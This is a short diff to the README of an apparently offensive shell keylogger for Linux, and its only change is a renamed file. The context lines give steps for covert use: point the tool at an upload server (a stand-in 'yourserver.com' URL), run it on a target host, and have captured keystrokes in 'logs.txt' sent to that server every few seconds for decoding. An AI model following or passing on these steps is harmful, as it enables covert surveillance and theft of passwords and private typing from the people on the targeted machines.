@@ -8,7 +8,7 @@ A streamlined keylogger for Linux systems written in shell.
 - Replace "http://yourserver.com/upload" with your own upload server url.
 - Run "simple_keylog.sh" on target host.
 - "logs.txt" will upload to your server and update every X number of seconds according to your specification.
-- Move "log_decoder.py" and "sentencer.py" to the same directory of server as "logs.txt" or create a new folder and add all files to it.
+- Move "decoder.py" and "sentencer.py" to the same directory of server as "logs.txt" or create a new folder and add all files to it.
 - cd to directory where both files are contained and you can either run:
 ```
 python3 decoder.py 
